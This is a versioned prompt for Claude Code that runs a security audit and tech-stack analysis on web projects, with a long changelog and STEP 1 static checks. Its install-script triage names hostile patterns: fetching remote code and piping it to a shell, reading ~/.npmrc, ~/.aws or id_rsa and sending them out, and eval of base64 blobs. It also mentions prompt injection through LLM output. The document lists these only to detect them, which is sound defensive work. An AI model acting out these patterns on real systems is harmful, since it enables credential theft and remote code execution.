# Claude Code Security Scan & Tech Stack Extraction Prompt

Paste this into Claude Code inside a project directory (single-project mode) or a parent directory containing multiple projects (batch mode).

---

```
# Security Scan Prompt v7.6

Scan this project and give me a full security audit and code analysis.

**v7.6 additions (2026-08-13) — the scan's own blind spots, from one project's remediation day:**

Every item below is a class this scan **did not catch, or reported wrongly**, found while remediating a
single app. Four of the five are credentials or endpoints that outlived the thing that needed them —
the scan is repo-scoped, and none of them lived in a repo.

- **I13 (BLOCKING): a stale or dirty local clone must SUPPRESS deployed-state findings, not just note them.** `repo-sync-skipped-dirty` already existed as P4, and its own row says the scan "read possibly-stale local code" — but nothing acted on it. STEP 1B kept comparing live production headers against local config. On a clone **17 commits behind origin**, that produced a `deployed-header-mismatch` **P2 for a CSP that had been fixed a month earlier**. The false finding survived two scan cycles and was still being carried as live. A comparison between live production and stale local is not a weak signal; it is not a signal.
- **Phase 7 could not have caught the one real secret in `~/.claude/`.** Its patterns are vendor-prefix only (`sk-`, `ghp_`, `AKIA`, `xox`, `BEGIN PRIVATE KEY`). The genuine hit was a **36-character UUID bearer token hardcoded inside a permission allow-rule** — matching none of them. It was found by an agent reading the settings file, not by the sweep that exists to find it. Added prefixless-credential patterns.
- **Deleting a secret from `~/.claude/` does not remediate it.** The same token persisted in **9 `file-history/` snapshots** (97 dirs, 113 MB, months deep) after the rule was removed. Phase 7 now reports history copies alongside the primary hit and states that **rotation is mandatory** — deletion alone is not remediation.
- **New: orphaned platform credentials.** A live 55-character API key sat in the deploy platform's env for ~131 days, **referenced nowhere in any repo**. Repo-scoped grep structurally cannot see this. Diff platform env key names against keys referenced in source.
- **New: retired-backend endpoints that were never revoked.** A migrated-away Google Apps Script web app was still deployed `Execute as: Me` / `Who has access: Anyone`, with **unauthenticated read AND write/delete** over a live Sheet — reachable by anyone holding the URL. A sibling app's equivalent held customer names, phones and emails. The scan cannot reach Google Workspace, so this is detected by its **fingerprint in git history** and handed to a human. Do not claim coverage of a platform you cannot query.
- **Two grep-able classes** from real production defects on the same app: `req.query.X` consumed as a string with no array guard (repeated params parse to an array → HTTP 500, uncached, re-invoked every request), and a CDN-cached serverless route that does not validate its query string (unknown params fork the cache key, bypassing `s-maxage` and re-invoking upstream work on every call).
- 5 new categories: `orphaned-platform-credential`, `retired-backend-endpoint-live`, `retired-backend-endpoint-unverified`, `query-param-array-crash`, `unvalidated-query-cache-fork`. The `file-history` retention rule extends the existing `ai-config-dangerous` finding rather than adding a key — it is the same secret, with a remediation correction.

**v7.6 corrections applied before release — cross-vendor review (Codex) plus empirical testing of every new snippet:**
- **The retired-backend check originally scored P1 from a git-history hit alone.** That is the exact inferred-state defect I1 exists to prevent: history proves a string existed, not that anything is deployed, and a repo that correctly removed *and* revoked an endpoint would have scored a critical false positive. Now it **recovers the URL and probes it**, with severity from the response (200 unauthenticated → P1, 401/403 → P2, 404 → clean) and a separate `-unverified` P3 handoff when no probe is possible.
- **It also originally suppressed on "still referenced in current source."** Tested against the repo that produced the finding: the dead Apps Script URL is still referenced by a completed one-shot migration script, so the rule **would have stayed silent on its own founding case**. A surviving reference from a migration or legacy tool says nothing about whether the endpoint is deployed. Suppression removed.
- **The env-orphan grep recursed through `node_modules` and build output** — a dependency mentioning the same name made an orphan look referenced (121 apparent references vs 7 real ones on the test repo). Now excluded, scoped to one environment, and the platform-injected exclusion that was described in prose is actually implemented.
- **A bracket-form extraction used ERE lookahead**, which `grep -E` does not support: it silently matched nothing, which would have dropped every `process.env["X"]` reference and manufactured false orphans. Replaced with a plain uppercase-token match, verified against dot, bracket-double-quote and bracket-single-quote forms.
- **An env var NAME is not a credential.** Severity is now by name shape (`*_KEY`/`*_SECRET`/`*_TOKEN`/… → P2; feature flags, public IDs and URLs → P4), and the flag text must say the value was never inspected.
- **`searchParams.get()` was wrongly grouped with `req.query` array crashes.** `URLSearchParams.get()` returns `string | null` and never an array (`getAll()` is the array form) — verified in Node. Including it would have produced pure false positives. Rule now scoped to array-returning parsers only.
- **The `file-history` count command was prose in a code block**, not runnable. Replaced with an executable procedure that anchors on a non-secret string so the credential never enters argv or shell history.
- **I13's freshness check counted all dirty files** while the rule spoke about STEP 1B config files; it now gates on `behind`/`unknown upstream`/`dirty config` specifically, and the `repo-sync-skipped-dirty` row was rewritten to cover all three conditions rather than only the original orchestrator-injected dirty case.
- Both new checks were validated end to end against a repo with a **known answer**: they returned exactly the one real orphaned credential and the one real retired-backend fingerprint, with no false positives.

**v7.5 additions (2026-08-01) — SCAN INTEGRITY RULES, from twelve owner audits of a full v7.5 cycle:**
- New **SCAN INTEGRITY RULES** section (I1-I12), immediately before FLAG OUTPUT RULES. Every rule comes from a defect found in the SCAN, not in an app. Read it before STEP 1.
- **I1 never bound severity on an inferred ABSENCE** — a scan lowered a finding because "no DELETE policy exists in any migration"; the live database had a permissive one, allowing cross-tenant deletion. Presence claims degrade gracefully; absence claims do not.
- **I2 Accepted Risks must survive regeneration** — 212 accept/resolve decisions across 26 projects live INSIDE the regenerated block, surviving only if an agent remembers. Reproduce every row verbatim including scope notes; never emit an accepted category as active.
- **I3 do not damage the repo you are scanning** — scan commits broke a live app's production deploys twice (~5.5 days) via a prettier-gated build, and `[skip ci]` hid it without preventing it. Run the repo's own gate before committing.
- **I4 count root advisories, not affected packages**, and verify a patched release exists and is API-compatible before calling a fix available.
- **I5 judge a deny list by effective strength** — an allowed interpreter (`node`, `cat`, `npx`) voids every path-based Bash deny.
- **I6 strip comments before matching** — four owners reported `innerHTML` matched inside comments saying the code avoids it. A regex reading prose as structure is this scan's most common defect.
- **I7 score a dimension N/A when the mechanism is absent** (cookie flags on token-auth apps); a CSP is not a compensating control for a JS-readable session cookie; "present but permissive" is not "absent."
- **I8 skipped is not passed** · **I9 shared Postgres project is not a shared namespace** (a routine `DROP ... IF EXISTS` would have destroyed a sibling app's 76k-row audit table) · **I10 enumerate every instance and headline the severe half** · **I11 two new grep-able classes** (`auth-gate-fails-open-on-missing-config`, `auth-matcher-unanchored-exclusion`) · **I12 assorted owner corrections**.
- 2 new categories. Version deliberately held at v7.5 — same working week, same release.

**v7.5 fixes (2026-07-30) — severity must describe THIS app's exposure, not the advisory's headline:**
- **Dependency CVE reachability tiers (BLOCKING).** `npm-cve-critical` / `npm-cve-high` are no longer flat P1. Severity is now assigned by reachability: **P1** reachable in the production tree, **P2** in the production tree but reachability disproven by cited evidence, **P3** dev/build-only (`npm audit --omit=dev` clean). Down-severities require named evidence and an escalation tripwire; an inconclusive trace uses the higher tier. See the rule in SECURITY FLAG RULES.
- **Why:** the taxonomy said `npm-cve-high | P1` flatly, while actual portfolio practice was P3 for dev-only (8 instances), P2 for prod-but-unreachable (2), and P1 only for prod-and-reachable (3). The written rule and the practice disagreed, so agents split — on the 2026-07-30 cycle four projects down-severitied on reachability while fourteen applied P1 mechanically, and one emitted an `npm-cve-critical` **P1** whose own flag text read *"dev-only — never shipped."* Portfolio P1 rose ~9× from a rubric change rather than a posture change, burying the genuinely new findings and destroying cycle-over-cycle comparability.
- **STEP 1B URL-extraction fallback (BLOCKING).** Before concluding "no URL found", probe `metadataBase`/sitemap targets, `.vercel/repo.json`, and prior-scan-recorded URLs — not just `vercel.json`/`CNAME`/`homepage`. Two live public sites were recorded as `_Not deployed_` with STEP 1B skipped entirely; both answered HTTP 200 when probed. Same defeat-by-input-selection class as the v7.3 `.nvmrc` bug.
- **`static-admin-bearer` severity by CALLER MODEL (BLOCKING).** Was flat-critical, so a VPS-to-Vercel cron with a high-entropy secret scored the same as an `/api/admin/*` route in `PUBLIC_PATHS` returning every customer's records. Now P1 human-reachable or cross-tenant, P2 machine-only but mutating/data-returning, P3 machine-only and inert. "Machine-only" requires cited evidence (cron declaration, platform header check, calling service) — a high-entropy secret does NOT lower the tier by itself, and the rationalization traps still govern whether it fires at all.
- **Added the missing `repo-sync-skipped-dirty` (P4) taxonomy row.** The orchestrator injects this key every cycle, but it was absent from the table — so it collided with the "never use a category key outside the taxonomy" rule and every agent had to resolve the contradiction itself.
- **Known limitation, not fixed here:** two `check-standards.mjs` assertions are name-shaped rather than behavior-shaped and err in both directions — a repo whose dataset merely *describes* other apps' notification code scored a false `fail`, and an app with a real operator kill switch named `paused`/`isNotificationsPaused` scored a false `kill-switch` fail. Same root cause as the `durable-event-FIRST` assertion removed 2026-07-17. Keep pasting script output verbatim and put any doubt in a separate adjudication section — never re-score.

**v7.4 additions (2026-07-16) — standards compliance becomes MEASURED, not asserted:**
- New **STEP 1D: STANDARDS COMPLIANCE** — runs `~/.claude-sync/standards/check-standards.mjs . --json` and pastes the result verbatim into a new top-level `standards` key. **Deterministic script, not LLM judgment.**
- **Why:** this scan had no standards check at all, yet `data/apps.js` carried LLM-written prose claiming an app "follows NOTIFICATION-STANDARD v0.3" — while that standard's own audit says the app is PARTIAL (missing installation_id, outbox/retry, kill switch). The scan was reporting compliance it never checked, in a file the owner trusts. Prose fields can only ever say nice things; they structurally cannot render a NO.
- **Hard rule:** standards compliance may ONLY be reported in the `standards` key, from script output. `strengths` / `integrations` and every other prose field must never name a standard or its version.
- Rules that can't be expressed as assertions are reported as **unknown, never as a pass**. Script unavailable → `standards: null` + `standards-check-unavailable` (P4). An honest null beats a plausible guess.
- New categories: `standard-violation` (P2; P1 on `commercial` tier), `standard-partial` (P3), `standards-check-unavailable` (P4).

**v7.3 fixes (2026-07-15) — `.nvmrc` vs `engines` conflation: a suppressed-flag bug, not a typo:**
- **Root cause:** STEP 1 and the flag rule both read `.nvmrc` **or** `package.json` engines as interchangeable sources for the Node runtime. They are not. `.nvmrc` is the **local dev toolchain**; `engines.node` (and for Firebase, `functions/package.json` engines) is the **deployed runtime**. When they disagree the scan could pick either — and picking `.nvmrc` **silently suppressed an `outdated-runtime` flag on a real EOL-bound Node 20 Cloud Functions runtime**. A check was defeated by its own input selection; the wrong doc line was cosmetic, the missed flag was not.
- **Fixed in three places** (the original report found two — the taxonomy row was also conflated): the STEP 1 runtime check, the `outdated-runtime` flag rule, and the CATEGORY TAXONOMY description.
- **New rule:** the **deployed** runtime is the ONLY source for `outdated-runtime` — `functions/package.json` engines when present (Cloud Functions), else root `package.json` engines. **`.nvmrc` may never be reported as a deployed runtime and may never clear the flag.**
- **New category `runtime-declaration-mismatch` (P4)** — when `.nvmrc` and the deployed `engines.node` declare different majors, surface the drift instead of silently picking one. This is what makes the class of miss self-reporting rather than latent.
- STEP 3 / `claude-md-template.md`: the Backend row must carry the **deployed** runtime and must never cite `.nvmrc`.

**v7.2 additions (2026-06-24) — dependency supply-chain hardening + mass-assignment upgrade (borrowed selectively at the methodology level from the public Anthropic-Cybersecurity-Skills corpus; pentest/live techniques discarded, only static-scannable detection kept — no third-party code or skills installed):**
- STEP 1: install-script triage upgraded — the existing `supply-chain-install-scripts` (P3) bullet now escalates to a new **`malicious-install-script` (P1, A08)** category ONLY on a dangerous *combination* (remote fetch + execution, credential read + network exfil, or obfuscation + execution) — a single weak signal (`process.env`, `node -e`, `atob(` alone) stays P3. Emitted INSTEAD OF `supply-chain-install-scripts` for that dependency, never both. Splits real install-time malware out of the benign-install-script noise (~2% of npm packages use install scripts legitimately — the *behavior combination*, not the presence, is the signal).
- STEP 1: new **`dependency-confusion` — PROVISIONAL (Watch List only), A08** — scoped/internal-looking packages with no private-registry pin in `.npmrc`. Kept provisional (not an Active Flag) because confirming a name is actually private/claimable needs a registry-ownership lookup the unattended prompt can't do — `.npmrc`-absence alone false-positives on legitimate public scopes. Joins the candidate-generation script lane with `typosquat-dependency`. (Caught by Codex on the v7.2 review.)
- STEP 1: new **`typosquat-dependency` — PROVISIONAL (Watch List only)** — dependency names within edit-distance 1–2 of a popular package. Pure-prompt name-similarity is unreliable (needs Levenshtein + registry age/download lookups), so this joins the candidate-generation script lane alongside the v7.1 provisionals; never an Active Flag until that script layer lands.
- STEP 1: `mass-assignment` (still PROVISIONAL) definition sharpened — widened the privileged-field list and made the predicate an explicit **allowlist-vs-denylist** test: a schema that STRIPS unknown keys clears; a denylist that deletes a few known-bad keys does NOT.
- STEP 1: `nosql-injection` (existing P1) sharpened — added the operator-injection signature: request input reaching a Mongo/Mongoose query as an *object* rather than a coerced string, enabling `$ne`/`$gt`/`$regex`/`$where` auth-bypass — not just raw query concatenation.
- Scope note: the source corpus is a pentest/SOC/forensics collection (live targets, Burp, "written authorization") — out of scope for Watchtower's unattended static portfolio sweep. Only the detection substance that survives as static code review was adopted.

**v7.1 additions (2026-06-12) — multi-file authorization & protocol checks (verified against two production codebases, cross-vendor: Claude Fable 5 + Opus 4.8 + OpenAI Codex):**
- STEP 1: eleven semantic-logic checks for bug classes a single-file grep can't see, each hand-verified against real findings before inclusion. New categories: `unsigned-tenant-binding`, `oauth-state-not-verified`, `oauth-pkce-missing`, `static-admin-bearer`, `csv-formula-injection`, `token-in-logs`, `verbose-vendor-logging`, `external-redirect-fetch-unvalidated`, `rls-write-side-coverage`, `mass-assignment`, `trusted-client-header`.
- Five of these are **PROVISIONAL**: emit to the Watch List (confidence < 0.8) only, never Active Flags. `rls-write-side-coverage`, `mass-assignment`, `trusted-client-header` (never calibrated against a verified corpus); plus `verbose-vendor-logging` and `external-redirect-fetch-unvalidated` (calibrated, but pure-prompt adjudication proved run-to-run flaky — external-redirect produced a false NEGATIVE via partner-trust rationalization across four hardening rounds). All five await the hybrid candidate-generation script layer. Marked inline.
- `oauth-pkce-missing` is **advisory only (P4)** and fires solely on confirmed public clients (token exchange sends no client secret) — confidential clients never trip it. This is deliberately narrow: the class was false-positive-prone in testing until the secretless-exchange condition was added.
- **Calibration record (v7.1, two production codebases, multi-round):** the six non-provisional checks (`unsigned-tenant-binding`, `oauth-state-not-verified`, `oauth-pkce-missing`, `static-admin-bearer`, `csv-formula-injection`, `token-in-logs`) reached stable, correct verdicts across repeated runs and across both repos ONLY after a **decision-policy** change, not prose hardening alone: the agent adjudicates a structural predicate (fire unless a LISTED exemption is provably cited; "seems safe"/"can't prove exploit" → Watch List, never silence) rather than free-forming "is this exploitable?". Pure-prompt judgment without that policy oscillated between false-negative-heavy (lenient) and false-positive-heavy (aggressive). The cross-file dataflow checks resisted even the policy flip — hence their provisional status and the planned script layer.
- Methodology note: these checks target the gap a pattern-scanner structurally can't reach — verifying a control is not just *present* but *correct for the right user and the right data*. Multi-file authorization and OAuth-protocol dataflow are the highest-value blind spots. Confirmed semantic findings should graduate into deterministic checks here at each version bump.

**v7.0 additions (2026-06-09/10) — error-handling and memory-growth sweeps, strengths line, health grade, docs freshness:**
- Docs freshness: `scans/check_docs_freshness.py` (deterministic script, NOT an LLM check) validates hand-written doc claims per project — dev commands vs package.json scripts, backticked repo-relative path references vs disk (with abbreviated-path suffix matching, cross-root resolution, and intentional-nonexistence filtering), SESSION-HANDOFF freshness vs commits, `Last reviewed: YYYY-MM-DD` ages. Runs in Phase C of the scheduled flow with `--merge`; at most ONE consolidated P4 `stale-docs` flag per project. New category `stale-docs`.
- STEP 3 CLAUDE.md: new machine-written `## Dev Commands` heading inside the SCAN:AUTO block, generated from package.json scripts each scan — derivable content can't go stale when a machine rewrites it. STEP 4 now validates 9 headings.
- Client-prefix env grep narrowed: flags credential-shaped names (SECRET / SERVICE_ROLE / PRIVATE, or ending _KEY / _TOKEN) or credential-looking values — `NEXT_PUBLIC_ADMIN_URL` no longer false-positives.
- STEP 1: swallowed-exception sweep — empty `catch {}` blocks and catch/except bodies that neither log, rethrow, nor surface the error. Silent failures hide both bugs and attacks; new category `swallowed-exception` (OWASP A09).
- STEP 1: unbounded in-memory growth sweep — module-level Map/Set/array/object collections written to from request handlers with no eviction path (delete/clear/TTL/LRU/max-size). Complements `serverless-memory-state` (which covers cold-start resets); new category `unbounded-growth`.
- STEP 2 JSON + STEP 3 CLAUDE.md: new required `strengths` output — one concrete, verified sentence on what this codebase does well (e.g. "Signature-verified webhooks, RLS on every table, Playwright coverage on auth + checkout"). Tells a future refactor what not to break. New `## Strengths` heading in the SCAN:AUTO block, enforced by STEP 4.
- Dashboard (no scan work): health grade A–F per app, computed client-side from data the scan already emits — active flag severities, test posture, file-size hygiene, scan recency. Formula documented in the dashboard's grade modal.

**v6.9 additions (2026-06-09) — Edge Function secrets, client-prefix misnaming, prompt bug fixes:**
- STEP 1: Supabase Edge Function secret sweep — grep `supabase/functions/` for hardcoded keys/tokens/JWTs (uses existing `hardcoded-secrets` category; Edge Function source ships to version control and the deploy bundle)
- STEP 1: client-prefix env var misnaming grep — `NEXT_PUBLIC_*`/`VITE_*` names containing SECRET/SERVICE/PRIVATE/ADMIN/WEBHOOK ship to the client bundle by framework convention regardless of intent (uses existing `env-exposure` category)
- Fix: NVD API key prose said "query param"; NVD API 2.0 takes the key as the `apiKey` request header, which is what the curl examples already did. Prose corrected to match.
- Fix: STEP 3 / claude-md-template SCAN:AUTO marker examples were frozen at "v6.4" — now read "v6.9"; always stamp the marker with the version from this prompt's title line.
- Phase 11: Windows path note — `~/.claude/` paths resolve to `%USERPROFILE%\.claude\`; use `sha256sum` from Git Bash or `Get-FileHash` in PowerShell.

**v6.8 additions (2026-06-06) — relax file-size heuristic for AI-readable code:**
- `file-over-500` threshold raised from 500 to **1500 lines, uniformly across all file types** (.js, .ts, .jsx, .tsx, .css, .html, .py, etc.). The prior 500-line cutoff was 2000s-era human-reading guidance; AI-readable code can be denser without becoming unworkable, and the proxy weakens as humans stop being the primary readers.
- Category key stays `file-over-500` for backwards compatibility with existing scan history and dashboard fields (`metrics.filesOver500`). Semantic meaning shifts: "files over the split threshold" with threshold now 1500.
- The .jsx/.tsx-specific 1500 carveout from earlier prompts is now the universal default; no per-extension exception.
- Cohesion still matters more than raw line count. A 1200-line file doing one thing is fine; a 300-line file doing six things is worse. Use the flag as a "consider splitting" signal, not a mandatory refactor trigger.

**v6.7 additions (2026-05-21) — OWASP Top 10 (2021) categorization:**
- Every flag category in the taxonomy now maps to an OWASP Top 10 (2021) category where applicable (AI supply-chain and project-hygiene flags have no OWASP equivalent — left blank)
- STEP 2 JSON output: each flag may include an optional `owasp` field (e.g., `"owasp": "A05"`) when the flag's category maps to one
- New section "OWASP TOP 10 MAPPING" added below the CATEGORY TAXONOMY — single source of truth for flag → OWASP mapping
- Mapping reference: https://owasp.org/Top10/ (CC BY-SA 4.0)
- Inspired by the structured threat-modeling approach in gstack's `cso` skill. No code copied; implementation is original.

**v6.6 additions (2026-05-15) — sourced from Codex adversarial review of v6.5:**
- STEP 1: SSRF user-URL-fetch grep, webhook replay protection check, open-redirect detection, path-traversal in file read/download, prototype-pollution merge grep, auth-endpoint rate-limiting check
- STEP 1B: CORS origin reflection + credentials probe, SSRF live probe against `/api/proxy?url=`-style routes, exposed-endpoint curl sweep (`/.env`, `/.git/HEAD`, `/backup.sql`, `/actuator`, etc.)
- New flag categories: cors-origin-reflection, ssrf-user-url-fetch, webhook-replay-unprotected, open-redirect-unvalidated, path-traversal-file-read, prototype-pollution-merge, public-sensitive-endpoint, auth-endpoint-no-rate-limit

**v6.5 additions (2026-05-15):**
- STEP 1: service_role key surface count, Stripe webhook signature pattern, GitHub Actions unpinned-uses check, LLM-output-into-DOM trace, audit-log + period-locking schema check (formalized from DATA INTEGRITY RULES)
- STEP 1B: DMARC/SPF/DKIM/CAA DNS audit, unauthenticated cron/webhook endpoint audit
- STEP 1C: Phase 11 (memory file hash drift detection), Phase A LLM spend-cap inventory reminder
- New flag categories: missing-dmarc, dmarc-policy-none, missing-spf, missing-caa, excess-service-role-surface, stripe-webhook-unverified, gha-unpinned-action, llm-output-dom-render, missing-audit-log, missing-period-lock, ai-memory-file-drift, llm-spend-cap-unverified, unauthenticated-cron, unauthenticated-webhook

## MODE DETECTION

First, determine the operating mode:
- If the current directory contains package.json, index.html, or a src/ directory → SINGLE PROJECT MODE (scan this directory)
- If the current directory contains subdirectories that each have package.json or index.html → BATCH MODE (scan each project subdirectory using parallel agents)
- In BATCH MODE, skip directories named node_modules, .git, .next, dist, build

In SINGLE PROJECT MODE, perform all steps below on the current directory.
In BATCH MODE:
1. **First**, run STEP 1C (AI Tool Supply Chain) ONCE for the whole scan cycle — global findings go to `data/ai-tool-intel.js` in the Watchtower runtime repo (the directory pointed at by `watchtowerRoot` in `watchtower.config.json`). STEP 1C is not per-project; it audits the Claude Code environment that runs all projects.
2. **Then**, launch a parallel agent for each project subdirectory. Each agent performs STEP 1, STEP 1B, STEP 2, STEP 3 independently and returns its JSON result. STEP 1C agents may also append per-project flags (e.g., MCP servers in that project's `.claude/settings.local.json`) to that project's `flags` array using categories prefixed `ai-`.

---

## STEP 1: SECURITY SCAN & CODE ANALYSIS

Read package.json, config files, .env.example or .env.local.example, API routes, auth code, and git history.

Run these commands and include the results:
- Run `npm audit --json` and summarize any high/critical vulnerabilities
- **Prettier check (MUST run the command — do not estimate file counts):**
  1. First check for Prettier config: look for `.prettierrc`, `.prettierrc.json`, `.prettierrc.js`, `.prettierrc.yaml`, or a `prettier` key in `package.json`. If none exist, skip the check and record `prettierConfigFound: false` with no flag.
  2. Run `npx prettier --check . 2>&1` (do NOT pass `--ignore-path .gitignore` — let Prettier read the project's own `.prettierignore`, which is the author's intended exclusion list). Capture stdout and stderr.
  3. If the output contains `All matched files use Prettier code style!` → record `prettierClean: true`, `filesNeedingFormat: 0`, and emit NO flag.
  4. If the output contains `Code style issues found in N files` → record `prettierClean: false`, set `filesNeedingFormat` to the EXACT integer N from the Prettier output (not your own count, not any other heuristic). The `formatting-inconsistency` flag's text MUST reference the same integer N. Confidence MUST be `1.0` because this check is deterministic.
  5. If the command fails (e.g., Prettier not installed), record `prettierConfigFound: <bool>`, `prettierClean: null`, `filesNeedingFormat: null`, and emit NO flag. Note the failure reason in scan notes.
  6. CRITICAL: do not emit a `formatting-inconsistency` flag without having observed a failing `prettier --check` run in THIS scan. Do not carry the flag over from prior scans. Do not emit the flag alongside a resolved entry claiming "All files pass Prettier check" — these contradict each other.
- Run these git history searches for leaked secrets (check ALL patterns):
  - `git log --all -p -S "AKIA" -- '*.env' '*.yml' '*.yaml' '*.json' '*.toml'` (AWS keys)
  - `git log --all -p -S "sk-" -- '*.env' '*.yml' '*.json' '*.ts' '*.js' '*.py'` (OpenAI/Stripe keys)
  - `git log --all -p -G "ghp_|gho_|github_pat_"` (GitHub tokens)
  - `git log --all -p -G "xoxb-|xoxp-|xapp-"` (Slack tokens)
  - `git log --all -p --diff-filter=A -- '*.env*' '*.key' '*.pem'` (general secrets)
  - For each match: note the commit hash, date, file, and whether the secret is still in the current tree
- Check if any .env files (not .env.example or .env.sample) are tracked by git: `git ls-files '*.env' '.env.*' | grep -v '.example\|.sample\|.template'` — tracked .env files are leaked secrets
- Check production dependencies for install scripts that could be supply chain attacks: look for preinstall, postinstall, or install scripts in direct production dependencies' package.json files (devDependency install scripts are lower risk). **Triage by behavior, don't just count.** A benign build step (node-gyp compile, `husky install`, `patch-package`) stays `supply-chain-install-scripts` (P3). Escalate to `malicious-install-script` (P1) ONLY on a dangerous COMBINATION, never a single weak signal — bare `node -e`, `process.env`, `Function(`, `atob(`, or a lone fetch all appear in benign installers and do NOT qualify alone. Require one of: (a) **remote fetch + execution** — downloads code (`curl`/`wget`/`fetch`/`Invoke-WebRequest`) AND runs it (`| sh`, `| bash`, `node -e`, `eval`); (b) **credential access + exfil** — reads env/credential files (`~/.npmrc`, `~/.aws`, `id_rsa`, `.env`, `process.env`) AND sends them over the network; or (c) **obfuscation + execution** — a long base64/hex blob decoded (`atob(`/hex) AND passed to `eval(`/`Function(`/a shell. A single signal alone stays `supply-chain-install-scripts` (P3). Quote the offending script line. **Emit `malicious-install-script` INSTEAD OF `supply-chain-install-scripts` for that dependency — never both.**
- Check if source maps (.map files) are included in the production build output
- Run `gh repo view --json visibility -q .visibility` to check if the repo is public or private (if gh CLI is available, otherwise note "unknown")
- Count total lines of code: `find . -type f \( -name "*.js" -o -name "*.jsx" -o -name "*.ts" -o -name "*.tsx" -o -name "*.css" -o -name "*.html" -o -name "*.json" \) -not -path "*/node_modules/*" -not -path "*/.next/*" -not -path "*/dist/*" -not -path "*/build/*" -not -name "package-lock.json" | xargs wc -l`
- Map folder structure: `find . -maxdepth 2 -type d -not -path "*/node_modules/*" -not -path "*/.next/*" -not -path "*/dist/*" -not -path "*/.git/*"`
- Run `npx license-checker --summary --production` and flag any GPL/AGPL/copyleft licenses
- Node runtime — **`.nvmrc` and `engines` are NOT interchangeable; never collapse them into one fact:**
  - **Deployed runtime (the only source for `outdated-runtime`):** if `functions/package.json` exists (Firebase Cloud Functions), its `engines.node` **is** the deployed Cloud Functions runtime — use it, and only it, for any statement about the CF runtime. Otherwise use the root `package.json` `engines.node` (server/host runtime).
  - **Local toolchain only:** `.nvmrc` is the developer's local Node version. **NEVER report `.nvmrc` as a deployed runtime, and never let a current `.nvmrc` clear the `outdated-runtime` flag.** A repo may legitimately have both; they are separate facts.
  - FLAG `outdated-runtime` when the **deployed** runtime (per the rule above) is EOL or 2+ major versions behind current LTS — regardless of what `.nvmrc` says.
  - If both exist and declare **different majors**, also emit `runtime-declaration-mismatch` — the local toolchain and the deploy target have drifted, and any doc derived from the wrong one will lie.
  - Rationale (v7.3): reading `.nvmrc` as the runtime silently suppressed a real EOL-bound Node 20 Cloud Functions finding. Do not re-merge these two inputs.
- Check dist/, build/, .next/static/, public/ for accidentally bundled .env files
- Detect testing infrastructure: check for playwright.config.*, vitest.config.*, jest.config.*, cypress.config.*, *.spec.*, *.test.* files; check package.json devDependencies for @playwright/test, vitest, jest, cypress, @testing-library/*; count test files and note the framework, runner, and approximate test count

**v6.5 additions — supply-chain and AI-data-path code checks:**

- **service_role key surface count** (Supabase projects only):
  - Run `grep -rl "SUPABASE_SERVICE_ROLE\|SUPABASE_SERVICE_KEY\|supabase.service" --include="*.js" --include="*.ts" --include="*.mjs" --exclude-dir=node_modules .`
  - Count distinct files referencing the service role
  - If count > 2 → flag `excess-service-role-surface` severity moderate. Text: "service_role key referenced in N files (server-side bypass of every RLS policy). Each additional reference is another leak vector."
  - Fix: consolidate to a single `lib/supabaseAdmin.ts` module and import from there; audit each direct env var read

- **Stripe webhook signature verification pattern** (any project with `stripe` in deps):
  - Find files matching `**/api/**/webhook*.{js,ts,mjs}` or `**/api/**/stripe/**`
  - For each match: verify the file calls `stripe.webhooks.constructEvent(` (correct path) and NOT raw `JSON.parse(body)` or `await req.json()` before signature verification
  - Flag missing as `stripe-webhook-unverified` severity critical. Text: "Stripe webhook handler at {path} parses request body without calling stripe.webhooks.constructEvent — signature not verified."
  - Fix: refactor to read raw body with `req.text()`, then `stripe.webhooks.constructEvent(rawBody, sig, process.env.STRIPE_WEBHOOK_SECRET)`. Test by sending a request with a bogus signature header — it should reject.

- **GitHub Actions unpinned `uses:` entries:**
  - Walk `.github/workflows/*.{yml,yaml}` in the project
  - Regex over each `uses:` line. Pattern for unpinned: `uses:\s+[^@\s]+@(main|master|v\d+|v\d+\.\d+(\.\d+)?)\s*$` (anything not a 40-char SHA)
  - Flag each as `gha-unpinned-action` severity moderate. Text: "GitHub Action `{action}@{ref}` in {workflow-path} not pinned to a commit SHA — vulnerable to supply-chain compromise of the action repo."
  - Fix: pin to a SHA, e.g. `uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab # v3.5.2`. Tools: `pinact` or `ratchet` to auto-pin.
  - Note: Anthropic/Actions/GitHub-owned actions (`actions/*`, `github/*`) are lower risk but still worth pinning for reproducibility.

- **LLM output → DOM render trace** (any project importing `@anthropic-ai/sdk` or `openai` or `langchain`):
  - First identify LLM-using files: `grep -rl "@anthropic-ai/sdk\|from 'openai'\|from \"openai\"\|langchain\|anthropic.messages.create\|openai.chat" --include="*.{js,jsx,ts,tsx}" --exclude-dir=node_modules .`
  - For each file in that set, check the SAME file for: `dangerouslySetInnerHTML`, `innerHTML\s*=`, `marked(` (without `sanitize` option), `markdown-it()` (without sanitizer plugin), `DOMParser.*parseFromString`
  - If the same file does BOTH → flag `llm-output-dom-render` severity critical. Text: "{file} imports an LLM SDK AND uses an unsanitized DOM rendering path — customer-data-influenced LLM output may flow into innerHTML/dangerouslySetInnerHTML, creating a remote XSS vector via indirect prompt injection."
  - Fix: render LLM output as text (React's default JSX rendering escapes), or pipe through `DOMPurify.sanitize()` before rendering. Wrap user input in clear delimiters (`<user_input>...</user_input>`) so the model treats it as data, not instructions.

- **Audit-log table check** (Supabase + financial/commercial projects):
  - Grep migrations directory and schema files for `CREATE TABLE.*\(audit_log\|changelog\|history\|audit_trail\|event_log\)` (case-insensitive)
  - If absent AND the project is a financial app (budgeting, accounting, invoicing) OR a commercial app (the slug in `watchtower.config.json`'s `commercialAppSlug`, or any project with paying customers) → flag `missing-audit-log` severity moderate. Text: "No audit_log / changelog / history table found in migrations. {project} handles {commercial/financial} data; absence means disputed changes have no evidence trail."
  - Fix: add an `audit_log(id, table_name, record_id, action, changed_by, changed_at, old_values jsonb, new_values jsonb)` table and a generic trigger that fires on INSERT/UPDATE/DELETE on tracked tables.
  - Skip for non-commercial / non-financial projects (games, demos, internal dashboards don't need this).

- **Period locking check** (same financial/commercial projects as the audit-log check):
  - Grep migrations for triggers or RLS policies that prevent UPDATE/DELETE on records older than a configurable date
  - Patterns to look for: `BEFORE UPDATE.*period_locked`, `WHERE.*created_at.*<.*NOW.*INTERVAL`, `IF OLD.locked = true THEN RAISE`
  - If absent on a financial project → flag `missing-period-lock` severity moderate. Text: "No period-locking trigger or policy found. Records from closed fiscal periods (prior tax years, finalized invoices) can be freely modified — audit/tax risk."
  - Fix: add a `period_locks(period_end, locked_at)` table and a BEFORE UPDATE trigger that raises an exception when `OLD.created_at < (SELECT MAX(period_end) FROM period_locks WHERE locked_at IS NOT NULL)`.

